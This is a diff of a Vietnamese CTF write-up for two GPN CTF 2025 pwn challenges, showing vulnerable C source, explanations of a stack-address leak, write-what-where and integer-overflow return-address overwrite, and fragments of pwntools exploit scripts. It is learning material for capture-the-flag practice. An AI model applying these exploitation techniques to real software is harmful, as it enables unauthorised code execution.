@@ -1,11 +1,15 @@
-NASA
+## GPN CTF 2025/Pwn 
 
+1. NASA 
+
+![image](https://hackmd.io/_uploads/r1GdO7ENeg.png)
 
 Spawn challenge instance :
-
- ncat --ssl nasa.gpn23.ctf.kitctf.de 443
-source code Nasa.c :
-
+ ```
+  ncat --ssl nasa.gpn23.ctf.kitctf.de 443
+ ```
+source code Nasa.c : 
+```// gcc -Og -g3 -w -fsanitize=address nasa.c -o nasa
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
@@ -53,12 +57,13 @@ int main(void) {
 	}
 	return 0;
 }
-Với source code này, về logic đây là 1 bài Write What Where. Hàm provide_help giúp leak ra địa chỉ stack address, nên về exploit idea là chúng ta leak stack address và sau đó viết address của hàm win to the stack address và sau đấy call hàm win.
+```
+Với source code này, về logic đây là 1 bài Write What Where. Hàm provide_help giúp leak ra địa chỉ stack address, nên về exploit idea là chúng ta leak stack address và sau đó viết address của hàm win to the stack address và sau đấy call hàm win. 
 
-Nhưng bài này lại khacs hơn so với các bài khác là bài này cần phải build docker để có thể lấy libc từ trong docker patch vào file thì mới chạy được, chứ nếu chạy bình thường sẽ không chạy được.
+Nhưng bài này lại khacs hơn so với các bài khác là bài này cần phải build  docker để có thể lấy libc từ trong docker patch vào file thì mới chạy được, chứ nếu chạy bình thường sẽ không chạy được. 
 
-Sau khi build docker và lấy libc.so.6 từ trong dockerfile ra, ta sẽ tiến hành viết exploit cho bài này
-
+Sau khi build docker và lấy libc.so.6 từ trong dockerfile ra, ta sẽ tiến hành viết exploit cho bài này 
+```
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 from pwn import *
@@ -142,16 +147,24 @@ sla(b't\n', b'3')
 
 
 p.interactive()
-Note Editor
+```
 
 
-Spawn challenge instance :
 
+2. Note Editor 
+
+![image](https://hackmd.io/_uploads/HJboqAD4gg.png)
+
+Spawn challenge instance : 
+```
 ncat --ssl note-editor.gpn23.ctf.kitctf.de 443
-Source code :
+```
 
-Main.c :
+Source code : 
 
+Main.c : 
+
+``` 
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
@@ -291,8 +304,10 @@ int main() {
         }
     }
 }
-lib.c :
+``` 
 
+lib.c : 
+```
 #include <stdio.h>
 #include <unistd.h>
 
@@ -312,10 +327,12 @@ char *fgets(char* s, int size, FILE *restrict stream) {
 void win() {
     execve("/bin/sh", NULL, NULL);
 }
-Ở đây có 2 souce code C, nên ta sẽ phân tích từng cái 1 để hiểu code hoạt động như thế nào :
+```
 
-Nhìn chung, đoạn code cho phép chúng ta create note, append lines vào trong note, edit line at offset và truncate note. Về cơ bản í tưởng là note này được ghi chú ở trong 1 buffer với kích thước cố định, nên sau khi đọc code ta thấy được có int overflow tiềm ẩn ở trong hàm void edit :
+Ở đây có 2 souce code C, nên ta sẽ phân tích từng cái 1 để hiểu code hoạt động như thế nào : 
 
+Nhìn chung, đoạn code cho phép chúng ta create note, append lines vào trong note, edit line at offset và truncate note. Về cơ bản í tưởng là note này được ghi chú ở trong 1 buffer với kích thước cố định, nên sau khi đọc code ta thấy được có int overflow tiềm ẩn ở trong hàm void edit : 
+``` 
 void edit(Note* note) {
     printf("Give me an offset where you want to start editing: ");
     uint32_t offset;
@@ -337,14 +354,16 @@ void edit(Note* note) {
         printf("Maybe write something there first.\n");
     }
 }
-Ta có thể thấy từ đoạn code này dòng fgets(note->buffer + offset, length + 2, stdin) với length <= note -> budget + lookback, nếu như length là 1 giá trị rất lớn kiểu int_64max thì có thể ghi tràn qua cả giá trị âm, gây ra phá vỡ logic, vậy nên xuất hiện int overflow ở đây.
+```
+Ta có thể thấy từ đoạn code này dòng fgets(note->buffer + offset, length + 2, stdin) với length <= note -> budget + lookback, nếu như length là 1 giá trị rất lớn kiểu int_64max thì có thể ghi tràn qua cả giá trị âm, gây ra phá vỡ logic, vậy nên xuất hiện int overflow ở đây. 
 
-Ngoài ra khi xem trong hàm lib, với *cursor = '\0', cursor này có thể chạy khắp bộ nhớ gây ra buffer overflow khắp bọ nhớ vì nếu không kiểm tra size thì sau mỗi vòng lặp cursor sẽ continue running, gây ra buffer overflow cục bộ trên toàn chương trình.
+Ngoài ra khi xem trong hàm lib, với *cursor = '\0', cursor này có thể chạy khắp bộ nhớ gây ra buffer overflow khắp bọ nhớ vì nếu không kiểm tra size thì sau mỗi vòng lặp cursor sẽ continue running, gây ra buffer overflow cục bộ trên toàn chương trình. 
 
-Vậy nên í tưởng khai thác exploit sẽ là leak stack address, dùng int overflow để trigger buffer overflow và ghi đè lên return address để gọi được win function ra ngoài.
+Vậy nên í tưởng khai thác exploit sẽ là leak stack address, dùng int overflow để trigger buffer overflow và ghi đè lên return address để gọi được win function ra ngoài. 
 
-Ta sẽ bắt đầu thực hiện viết exploit :
+Ta sẽ bắt đầu thực hiện viết exploit : 
 
+``` 
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 from pwn import *
@@ -430,3 +449,6 @@ p.sendline(payload)
 
 p.sendlineafter(b't\n', b'6')
 p.interactive()
+```
+
+
